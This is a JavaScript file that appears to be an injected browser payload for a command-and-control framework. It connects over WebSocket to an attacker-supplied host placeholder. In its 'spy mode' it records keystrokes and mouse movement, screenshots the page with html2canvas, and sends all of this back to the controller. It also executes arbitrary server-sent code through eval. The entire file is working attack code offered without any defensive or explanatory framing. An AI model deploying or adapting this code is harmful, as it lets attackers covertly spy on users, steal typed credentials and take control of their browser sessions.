const poll_url = "[[HOST_REPLACE_ME]]/w".replace("http", "ws");

let res = {
	poll: "hearthbeat",
	uid: results["UID"],
	action_results: [],
	spy_mode: null,
};
let config = { spy_mode: true };
let tries = 0;
let socket 
while (tries < 3) {
	//console.log("Try: " + tries);
	try {
		socket = new WebSocket(poll_url);
		if (socket != null && socket != undefined) {
			console.log(socket);
			socket.onopen = function () {
				//console.log("Status: connected.");
			};

			socket.onmessage = function (e) {
				res = {
					poll: "hearthbeat",
					uid: results["UID"],
					action_results: [],
					spy_mode: null,
				};

				if (config.spy_mode) {
					let mouse_x = null,
						mouse_y = null;
					let pressed_keys = [];

					document.onmousemove = function (event) {				
						mouse_x = event.pageX;
						mouse_y = event.pageY;  
					}


					document.onkeydown = function (event) {
						pressed_keys.push(event.key);
					}
					

					try {
						html2canvas(document.body, {
							imageTimeout: 0,
							allowTaint: true,
							imageTimeout: 1000,
							logging: false,
							useCORS: true,
						}).then(function (canvas) {
							const context = canvas.getContext("2d");
							context.beginPath();
							context.arc(
								mouse_x,
								mouse_y,
								5,
								0,
								2 * Math.PI,
								false
							);
							context.fillStyle = "red";
							context.fill();

							res["spy_mode"] = {
								mouse: { x: mouse_x, y: mouse_y },
								keyboard: pressed_keys,
								image: canvas.toDataURL("image/png"),
								focused_element: document.activeElement,
							};
						});
					} catch (x) {
						res["spy_mode"] = {
							mouse: { x: mouse_x, y: mouse_y }, 
							keyboard: pressed_keys, 
							image: null,
							focused_element: document.activeElement,
						};
					}
				}

				let commands = JSON.parse(e.data); //This is a TriggerCommand json object
				let action;
				if (commands != null) {
					for (let id in commands) {
						//console.log(commands[id]);
						//console.log("Evaluating: " + commands[id].Code);
						try {
							action = {};
							action[commands[id].ID] = eval(commands[id].Code);
							res.action_results.push(action);
						} catch (ex) {
							console.log(ex);
							action = {};
							action[commands[id].ID] = ex;
							res.action_results.push(action);
						}
					}
				}
			};

			socket.onclose = function (event) {
				//console.log("TODO: cleanup");
			};

			break;
		}
	} catch (e) {
		console.log(e);
		tries++;
		setTimeout(function () {
			sleep(1000);
		});
	}
}

// All good, we can start polling
if (tries < 3) {
	setInterval(function poll() {
		socket.send(JSON.stringify(res));
	}, 2000);
} else {
	//Send error?
}
